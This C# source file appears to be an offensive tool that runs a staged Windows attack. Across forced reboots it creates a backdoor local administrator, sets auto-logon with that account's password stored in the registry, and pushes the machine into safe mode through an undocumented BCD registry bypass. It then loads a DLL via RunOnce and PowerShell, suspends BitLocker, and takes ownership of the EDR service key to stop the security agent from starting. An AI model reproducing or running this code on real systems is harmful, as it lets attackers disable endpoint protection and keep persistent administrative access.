using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System;
using System.Management;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using System.DirectoryServices;

namespace Program
{
    public class stage0
    {
        public static void Main()
        {
            
            // Perform interactive logon type 2 in order to cache compromised _domain_ creds on system so that they can be used in safe mode
            //WindowsLoadUserProfile lup = new WindowsLoadUserProfile();
            //lup.GoMain();

            // Alter registry for auto logon with compromised _domain_ creds
            //autoLogon al = new autoLogon();
            //al.domain();


            // Create new local user and add to local admin group. If this is set, make sure to set the correct registry autologon for local too (directly below)
            localAdminCreate zAdmin = new localAdminCreate();
            zAdmin.createUser();

            // Alter registry for auto logon with local creds (see directly above)
            autoLogon al = new autoLogon();
            al.local();

            // Alter registry to setup Safe Mode with Networking at next boot
            enableSMWN smwn = new enableSMWN();
            smwn.set();

            // Alter registry to set RunOnce entry to kick off next stage. This is what runs once the computer has boot up into safe mode
            runOnce ro = new runOnce();
            ro.stage1Go();

                  
            // Suspend BitLocker to prevent hangups on reboots. Can be disabled for virtual environment
            suspendBitLocker sbl = new suspendBitLocker();
            sbl.Suspend();


            // Initiate forced restart to get into safe mode 
            TokenManipulator.AddPrivilege("SeShutdownPrivilege"); 
            restart r = new restart();
            r.StartShutDown();


        }


    }


    public class stage1
    {
        public static void Main1()
        {
             
             // Remove safe mode boot that was previously set in stage0 using registry method
             disableSMWN smwn = new disableSMWN();
             smwn.remove();

             // writes some text to c:\users\public\safemode.txt just to confirm that the program made it into safe mode. this has been useful for troubleshooting
             confirmSafeMode csm = new confirmSafeMode();
             csm.write();

             // Assign required privileges to process token in order to make changes within registry
             TokenManipulator.AddPrivilege("SeRestorePrivilege");
             TokenManipulator.AddPrivilege("SeBackupPrivilege");
             TokenManipulator.AddPrivilege("SeTakeOwnershipPrivilege");

             // Do something nasty in safe mode like set EDR services to disabled
             neuterEDR ne = new neuterEDR();
             ne.neuterRegChange();

             // Alter registry to set RunOnce entry to kick off next stage
             runOnce ro = new runOnce();
             ro.stage2Go();           
             
             // Initiate forced restart
             TokenManipulator.AddPrivilege("SeShutdownPrivilege"); 
             restart r = new restart();
             r.StartShutDown();

        }
    }


    public class stage2
    {
        public static void Main2()
        {
             
            // Disabling auto logon
            disableAutoLogon dal = new disableAutoLogon();
            dal.s2AlterRegistry1();

            // Do some more things here once back in Normal Mode         

        }
    }


    public class WindowsLoadUserProfile
    {
        /// 
        /// The LogonUser function attempts to log a user on to the local computer.
        /// 
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool LogonUser(String lpszUsername, String lpszDomain, IntPtr lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr hToken);

        /// 
        /// The DuplicateTokenEx function creates a new access token that duplicates an existing token. This function can create either a primary token or an impersonation token.
        /// 
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, int dwDesiredAccess, ref SecurityAttributes lpTokenAttributes,
        int impersonationLevel, int tokenType, out IntPtr phNewToken);

        /// 
        /// The LoadUserProfile function loads the specified user's profile
        /// 
        [DllImport("userenv.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool LoadUserProfile(IntPtr hToken, ref ProfileInfo lpProfileInfo);

        /// 
        /// The UnloadUserProfile function unloads a user's profile that was loaded by the LoadUserProfile function
        /// 
        [DllImport("userenv.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnloadUserProfile(IntPtr hToken, IntPtr hProfile);

        /// 
        /// Closes an open object handle.
        /// 
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        /// 
        /// The SECURITY_ATTRIBUTES structure contains the security descriptor for an object and specifies whether the handle retrieved by specifying this structure is inheritable
        /// 
        [StructLayout(LayoutKind.Sequential)]
        public struct SecurityAttributes
        {
            public int dwLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        /// 
        /// Profile Info
        /// 
        [StructLayout(LayoutKind.Sequential)]
        public struct ProfileInfo
        {
            /// 
            /// Specifies the size of the structure, in bytes.
            /// 
            public int dwSize;

            /// 
            /// This member can be one of the following flags: PI_NOUI or PI_APPLYPOLICY
            /// 
            public int dwFlags;

            /// 
            /// Pointer to the name of the user. 
            /// This member is used as the base name of the directory in which to store a new profile. 
            /// 
            public string lpUserName;

            /// 
            /// Pointer to the roaming user profile path. 
            /// If the user does not have a roaming profile, this member can be NULL.
            /// 
            public string lpProfilePath;

            /// 
            /// Pointer to the default user profile path. This member can be NULL. 
            /// 
            public string lpDefaultPath;

            /// 
            /// Pointer to the name of the validating domain controller, in NetBIOS format. 
            /// If this member is NULL, the Windows NT 4.0-style policy will not be applied. 
            /// 
            public string lpServerName;

            /// 
            /// Pointer to the path of the Windows NT 4.0-style policy file. This member can be NULL. 
            /// 
            public string lpPolicyPath;

            /// 
            /// Handle to the HKEY_CURRENT_USER registry key. 
            /// 
            public IntPtr hProfile;
        }        /// 
        /// Logon type option. 
        /// 
        [FlagsAttribute]
        public enum LogonType
        {
            /// 
            /// This logon type is intended for users who will be interactively using the computer
            /// 
            Interactive = 2,
            /// 
            /// This logon type is intended for high performance servers to authenticate plaintext passwords. 
            /// 
            Network = 3,
            /// 
            /// This logon type is intended for batch servers, where processes may be executing on behalf of a user without their direct intervention.
            /// 
            Batch = 4,
            /// 
            /// Indicates a service-type logon. The account provided must have the service privilege enabled.
            /// 
            Service = 5,
            /// 
            /// This logon type is for GINA DLLs that log on users who will be interactively using the computer.
            /// 
            Unlock = 7
        }
        /// 
        /// Specifies the logon provider. 
        /// 
        [FlagsAttribute]
        public enum LogonProvider
        {
            /// 
            /// Use the standard logon provider for the system.
            /// 
            Default = 0,
            /// 
            /// Use the negotiate logon provider. (WINNT50)
            /// 
            Negotiate = 3,
            /// 
            /// Use the NTLM logon provider (WINNT40)
            /// 
            NTLM = 2,
            /// 
            /// Use the Windows NT 3.5 logon provider.
            /// 
            WinNT35 = 1
        }
        /// 
        /// Specifies the requested access rights for the new token.
        /// 
        [FlagsAttribute]
        public enum DuplicateTokenDesiredAccess
        {
            /// 
            /// To request the same access rights as the existing token, specify zero. 
            /// 
            SameAsExisting = 0,
            /// 
            /// To request all access rights that are valid for the caller, specify MAXIMUM_ALLOWED.
            /// 
            MaximumAllowed = 0x02000000
        }
        /// 
        /// Specifies a value from the SECURITY_IMPERSONATION_LEVEL enumeration that indicates the impersonation level of the new token 
        /// 
        [FlagsAttribute]
        public enum ImpersonationLevel
        {
            /// 
            /// The server process cannot obtain identification information about the client, and it cannot impersonate the client. It is defined with no value given, and thus, by ANSI C rules, defaults to a value of zero.
            /// 
            Anonymous = 0,
            /// 
            /// The server process can obtain information about the client, such as security identifiers and privileges, but it cannot impersonate the client. This is useful for servers that export their own objects, for example, database products that export tables and views. Using the retrieved client-security information, the server can make access-validation decisions without being able to use other services that are using the client's security context.,
            /// 
            Identification = 1,
            /// 
            /// The server process can impersonate the client's security context on its local system. The server cannot impersonate the client on remote systems.,
            /// 
            Impersonation = 2,
            /// 
            /// The server process can impersonate the client's security context on remote systems. This impersonation level is not supported on WinNT
            /// 
            Delegation = 3
        }
        /// 
        /// Specifies the requested access rights for the new token.
        /// 
        [FlagsAttribute]
        public enum TokenType
        {
            /// 
            /// The new token is a primary token that you can use in the CreateProcessAsUser function. 
            /// 
            Primary = 1,
            /// 
            /// The new token is an impersonation token. 
            /// 
            Impersonation = 2
        }

        public void GoMain()
        {
            WindowsLoadUserProfile wu = new WindowsLoadUserProfile();

            try
            {
                // already created user with cmd: net user testuser testpwd /ADD

                wu.LogonUser("Domain_account_here", System.Environment.UserDomainName, "domain_password_here",
                    LogonType.Interactive, LogonProvider.Default);

                wu.LoadUserProfile("domain_account_here"); // create user's profile if not exist

                wu.LogOffUser();
            }
            catch (Exception ex)
            {
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                while (ex != null)
                {
                    sb.AppendLine("Message: " + ex.Message);
                    sb.AppendLine("Source: " + ex.Source);
                    sb.AppendLine("Stack: ");
                    sb.AppendLine(ex.StackTrace);
                    ex = ex.InnerException;
                }
                Console.WriteLine(sb.ToString());
                if (System.Diagnostics.Debugger.IsAttached)
                    System.Diagnostics.Debugger.Break();
            }
        }

        IntPtr hToken = new IntPtr(0);
        IntPtr hProfile = new IntPtr(0);

        private void LogonUser(String user, String domain, /*SecureString password*/ String password, LogonType type, LogonProvider provider)
        {
#if false
            if (password.IsReadOnly() == false)
                throw new InvalidOperationException("SecureString not ReadOnly");
#endif
            if (string.IsNullOrEmpty(user) == true || string.IsNullOrEmpty(domain) == true)
                throw new InvalidOperationException("No user account specified");

            IntPtr handle;
            
            //IntPtr bstr = Marshal.SecureStringToBSTR(password);
            IntPtr bstr = Marshal.StringToHGlobalUni(password);

            bool result = LogonUser(user, domain, bstr, (int)type, (int)provider, out handle);
            
            //Marshal.ZeroFreeBSTR(bstr);
            Marshal.FreeHGlobal(bstr);

            if (result == false)
                throw new System.ComponentModel.Win32Exception();

            SecurityAttributes sa = new SecurityAttributes();
            sa.dwLength = Marshal.SizeOf(sa);
            sa.lpSecurityDescriptor = IntPtr.Zero;
            sa.bInheritHandle = true;

            IntPtr newHandle;
            result = DuplicateTokenEx(handle, (int)DuplicateTokenDesiredAccess.MaximumAllowed, ref sa,
            (int)ImpersonationLevel.Impersonation, (int)TokenType.Primary, out newHandle);
            if (result == false)
                throw new System.ComponentModel.Win32Exception();

            CloseHandle(handle);
            handle = newHandle;

            hToken = handle;
        }

        public void LoadUserProfile(string username)
        {
            if (hToken == IntPtr.Zero)
                throw new InvalidOperationException("User not logged in");

            ProfileInfo info = new ProfileInfo();
            info.dwSize = Marshal.SizeOf(info);
            info.lpUserName = username;
            info.dwFlags = 1; // PI_NOUI 0x00000001 // Prevents displaying of messages

            bool result = LoadUserProfile(hToken, ref info);
            if (result == false)
                throw new System.ComponentModel.Win32Exception();

            hProfile = info.hProfile;
        }

        internal void LogOffUser()
        {
#if false
string identity = WindowsIdentity.GetCurrent().Name;
string threadIdentity = Thread.CurrentPrincipal.Identity.Name;
scriptTask.State.AddMessage(DateTime.Now, string.Format("Logging off user {0} ({1})", identity, threadIdentity));
#endif

            WindowsIdentity.Impersonate(IntPtr.Zero);

#if false
identity = WindowsIdentity.GetCurrent().Name;
Thread.CurrentPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
threadIdentity = Thread.CurrentPrincipal.Identity.Name;
scriptTask.State.AddMessage(DateTime.Now, string.Format("Identity now {0} ({1})", identity, threadIdentity));
#endif

            if (hToken != IntPtr.Zero && hProfile != IntPtr.Zero)
            {
                bool result = UnloadUserProfile(hToken, hProfile);
                hProfile = IntPtr.Zero;

                if (result == false)
                    throw new System.ComponentModel.Win32Exception();
            }

            if (hToken != IntPtr.Zero)
            {
                bool result = CloseHandle(hToken);
                hToken = IntPtr.Zero;

                if (result == false)
                    throw new System.ComponentModel.Win32Exception();
            }

        }
    }


    public class localAdminCreate
    {

        public void createUser()
        {
            
            try

            {
                string Name = "local_user";
                string Pass = "password-goes-here";
                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                                    Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(Name, "user");
                NewUser.Invoke("SetPassword", new object[] { Pass });
                NewUser.Invoke("Put", new object[] { "Description", "A description goes here, if you want" });
                NewUser.CommitChanges();
                DirectoryEntry grp;
                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
            }

            catch

            {

            }

            

        }
    }

    public class autoLogon
    {

       public void domain()
       {
            const string s0ArKeyName1 = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
            Registry.SetValue(s0ArKeyName1, "AutoAdminLogon", "1");
            Registry.SetValue(s0ArKeyName1, "DefaultUserName", "username_here");
            Registry.SetValue(s0ArKeyName1, "DefaultDomainName", "domain_here");
            Registry.SetValue(s0ArKeyName1, "DefaultPassword", "password_here");

       }

       public void local()
       {
            const string s0ArKeyName1 = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
            Registry.SetValue(s0ArKeyName1, "AutoAdminLogon", "1");
            Registry.SetValue(s0ArKeyName1, "DefaultUserName", "local_user");
            Registry.SetValue(s0ArKeyName1, "DefaultPassword", "password-goes-here");

       }

    }

    public class disableAutoLogon
    {

       public void s2AlterRegistry1()
       {

            try
            {
            
                RegistryKey reg = Registry.LocalMachine;
                RegistryKey subKey = reg.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", true);  
                try
                {
                    subKey.DeleteValue("AutoAdminLogon");
                }

                catch
                {
                }
                
                try
                {
                    subKey.DeleteValue("DefaultUserName");
                }

                catch
                {
                }

                try
                {
                    subKey.DeleteValue("DefaultPassword");
                }

                catch
                {
                }
                

            } 

            catch (Exception)
            {
                return;

            }

       }

    }


    public class runOnce
    {

       public void stage1Go()
       {

            const string s1GoKeyName1 = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
            Registry.SetValue(s1GoKeyName1, "*Stage1Go", "powershell.exe -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\users\\public\\combined.dll;[Program.stage1]::Main1()\"");

       }


       public void stage2Go()
       {

            const string s2GoKeyName1 = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
            Registry.SetValue(s2GoKeyName1, "*Stage2Go", "powershell.exe -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\users\\public\\combined.dll;[Program.stage2]::Main2()\"");

       }

    }


    public class confirmSafeMode
    {
        [STAThread]
        public void write()
        {
            try
            {
                
                StreamWriter sw = new StreamWriter("C:\\users\\public\\safemode.txt");
                sw.WriteLine("Hello from safe mode");
                sw.Close();
            }
            catch(Exception e)
            {
                Console.WriteLine("Exception: " + e.Message);
            }
            finally
            {
                Console.WriteLine("Executing finally block.");
            }
        }
    }



    public class enableSMWN
    {

       public void set()
       {

            // Learning the default boot loader via WMI, which is different on every system (which complicates matters)
            
            ConnectionOptions connectionOptions = new ConnectionOptions();
            connectionOptions.Impersonation = ImpersonationLevel.Impersonate;
            connectionOptions.EnablePrivileges = true;


            ManagementScope managementScope = new ManagementScope(@"root\WMI", connectionOptions);
            ManagementObject privateLateBoundObject = new ManagementObject(managementScope, new ManagementPath("root\\WMI:BcdObject.Id=\"{9dea862c-5cdd-4e70-acc1-f32b344d4795}\",StoreFilePath=\"\""), null);

            ManagementBaseObject inParams = null;
            inParams = privateLateBoundObject.GetMethodParameters("GetElement");

            inParams["Type"] = ((UInt32)0x24000001);
            ManagementBaseObject outParams = privateLateBoundObject.InvokeMethod("GetElement", inParams, null);
            ManagementBaseObject mboOut = ((ManagementBaseObject)(outParams.Properties["Element"].Value));

            string[] osIdList = (string[]) mboOut.GetPropertyValue("Ids");

            foreach (string osGuid in osIdList)
            {
                ManagementObject currentManObj = new ManagementObject(managementScope, new ManagementPath("root\\WMI:BcdObject.Id=\"" + osGuid + "\",StoreFilePath=\"\""), null);
                var defaultBootLoader = ("" + currentManObj.GetPropertyValue("Id"));
                Console.WriteLine ("Default boot loader is: " + defaultBootLoader);

                var subKey1 = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
                var admins1 = new NTAccount("Administrators");
                var ac1 = subKey1.GetAccessControl();
                ac1.SetOwner(admins1);
                subKey1.SetAccessControl(ac1);
                
                // Grant access
                ac1.AddAccessRule(new RegistryAccessRule(admins1, RegistryRights.FullControl, AccessControlType.Allow));
                subKey1.SetAccessControl(ac1);
                Console.WriteLine("this is subkey1:" + subKey1);

                //This is an undocumented bypass of Windows controls designed to prevent modifications to the BCD store (notice the trailing space in the key. Windows will honor this as the regular key that does not have a space.)
                Registry.LocalMachine.CreateSubKey("BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements\\" + "\\25000080 ");
                string keyName = "HKEY_LOCAL_MACHINE\\BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements\\" + "\\25000080 ";
                Registry.SetValue(keyName, "Element", new byte[] { 01,00,00,00,00,00,00,00 }, RegistryValueKind.Binary);

            }
    
       }

    }



    public class disableSMWN
    {
        public void remove()
        {

            // Learning the default boot loader via WMI, which is different on every system (which complicates matters)
            
            ConnectionOptions connectionOptions = new ConnectionOptions();
            connectionOptions.Impersonation = ImpersonationLevel.Impersonate;
            connectionOptions.EnablePrivileges = true;


            ManagementScope managementScope = new ManagementScope(@"root\WMI", connectionOptions);
            ManagementObject privateLateBoundObject = new ManagementObject(managementScope, new ManagementPath("root\\WMI:BcdObject.Id=\"{9dea862c-5cdd-4e70-acc1-f32b344d4795}\",StoreFilePath=\"\""), null);

            ManagementBaseObject inParams = null;
            inParams = privateLateBoundObject.GetMethodParameters("GetElement");

            inParams["Type"] = ((UInt32)0x24000001);
            ManagementBaseObject outParams = privateLateBoundObject.InvokeMethod("GetElement", inParams, null);
            ManagementBaseObject mboOut = ((ManagementBaseObject)(outParams.Properties["Element"].Value));

            string[] osIdList = (string[]) mboOut.GetPropertyValue("Ids");

            foreach (string osGuid in osIdList)
            {
                ManagementObject currentManObj = new ManagementObject(managementScope, new ManagementPath("root\\WMI:BcdObject.Id=\"" + osGuid + "\",StoreFilePath=\"\""), null);
                var defaultBootLoader = ("" + currentManObj.GetPropertyValue("Id"));
                Console.WriteLine ("Default boot loader is: " + defaultBootLoader);


                var subKey2 = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements\\");
                
                {
                
                    // Determines if computer is configured for safe mode with networking
                    foreach (var i in subKey2.GetSubKeyNames().Where(i => i == "25000080 "))
                    {

                        Console.WriteLine("Computer is configured for safeboot based on: " + i);

                        var fullSafeBootKey = subKey2 + "\\25000080 ";
                        Console.WriteLine (fullSafeBootKey);
                        Console.WriteLine (defaultBootLoader);
                        

                        var open = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements\\");
                        Console.WriteLine ("Opened:" + open);
                        Console.WriteLine (i);


                        // Give Administrators full permissions of key
                        var subKeyPerm = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements\\" + i +"", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
                        var group = new NTAccount("Administrators");
                        var ac = subKeyPerm.GetAccessControl();
                        ac.AddAccessRule(new RegistryAccessRule(group, RegistryRights.FullControl, AccessControlType.Allow));
                        subKeyPerm.SetAccessControl(ac);

                        Console.WriteLine (subKeyPerm);


                        using(RegistryKey regkey = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects\\" + defaultBootLoader + "\\Elements\\", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
                        {
                            if (regkey.OpenSubKey("25000080 ") != null)
                            {
                                regkey.DeleteSubKeyTree("25000080 ");
                            }
                        }



                    }
                }


            }

            
    
        }

    }
            

    public class neuterEDR
    {

       public void neuterRegChange()
       {
             try

             {

             // Take ownership of registry key
             var subKey1 = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\EDR", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership);
             var admins1 = new NTAccount("Administrators");
             var ac1 = subKey1.GetAccessControl();
             ac1.SetOwner(admins1);
             subKey1.SetAccessControl(ac1);
             
             // Grant full control
             ac1.AddAccessRule(new RegistryAccessRule(admins1, RegistryRights.FullControl, AccessControlType.Allow));
             subKey1.SetAccessControl(ac1);
             
             // Modify values to prevent EDR agent from starting up in normal mode
             const string keyName1 = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EDR";
             Registry.SetValue(keyName1, "Start", 0);

             }

             catch
             {

             }

       }

    }

    public class suspendBitLocker
    {
       public void Suspend()
       {
       System.Diagnostics.Process process = new System.Diagnostics.Process();
       System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
       startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
       startInfo.FileName = "powershell.exe";
       startInfo.Arguments = "suspend-bitlocker -mountpoint 'c:' -rebootcount 3";
       process.StartInfo = startInfo;
       process.Start();
       }


    }


    class restart
    {

        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
        private static extern bool ExitWindowsEx(ExitWindows uFlags, int dwReason);
 
        private enum ExitWindows : uint
        {
            EWX_LOGOFF = 0x00,
            EWX_SHUTDOWN = 0x01,
            EWX_REBOOT = 0x02,
            EWX_POWEROFF = 0x08,
            EWX_RESTARTAPPS = 0x40,
            EWX_FORCE = 0x04,
            EWX_FORCEIFHUNG = 0x10,
        }

        public void StartShutDown()
        {
 
            ExitWindowsEx(ExitWindows.EWX_REBOOT | ExitWindows.EWX_FORCE, 0);
        }
    }


    public class TokenManipulator
    {

      [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
      internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
      ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);


      [DllImport("kernel32.dll", ExactSpelling = true)]
      internal static extern IntPtr GetCurrentProcess();


      [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
      internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr
      phtok);


      [DllImport("advapi32.dll", SetLastError = true)]
      internal static extern bool LookupPrivilegeValue(string host, string name,
      ref long pluid);


      [StructLayout(LayoutKind.Sequential, Pack = 1)]
      internal struct TokPriv1Luid
      {
       public int Count;
       public long Luid;
       public int Attr;
      }

      internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
      internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
      internal const int TOKEN_QUERY = 0x00000008;
      internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
      internal const string SeSecurity = "SeSecurityPrivilege";

      public static bool AddPrivilege(string privilege)
      {
       try
       {
        bool retVal;
        TokPriv1Luid tp;
        IntPtr hproc = GetCurrentProcess();
        IntPtr htok = IntPtr.Zero;
        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;
        retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
        retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        return retVal;
       }
       catch (Exception ex)
       {
        throw ex;
       }

      }
      public static bool RemovePrivilege(string privilege)
      {
       try
       {
        bool retVal;
        TokPriv1Luid tp;
        IntPtr hproc = GetCurrentProcess();
        IntPtr htok = IntPtr.Zero;
        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_DISABLED;
        retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
        retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        return retVal;
       }
       catch (Exception ex)
       {
        throw ex;
       }

      }
    }

}
